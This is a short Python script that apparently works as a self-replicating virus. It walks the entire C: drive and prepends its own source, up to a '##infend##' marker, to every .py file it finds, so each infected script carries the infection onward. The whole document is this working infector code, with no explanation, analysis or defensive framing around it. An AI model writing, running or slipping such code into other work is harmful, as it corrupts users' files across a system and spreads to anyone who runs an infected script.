import os;
for root, dirs, files in os.walk("c:\\"):
    for file in files:
        if file.endswith(".py"):
            infect = open(os.path.join(root, file));
            text = infect.read();
            infect.close();
            infect = open(os.path.join(root, file),'w');
            me = open(os.path.realpath(__file__));
            for string in me:
                if "##infend##" in string and "mark" not in string:#mark
                    break;
                infect.write(string);
            infect.write("##infend##");#mark
            infect.write('\n');
            infect.write(text);
            infect.close();            
            
##infend##

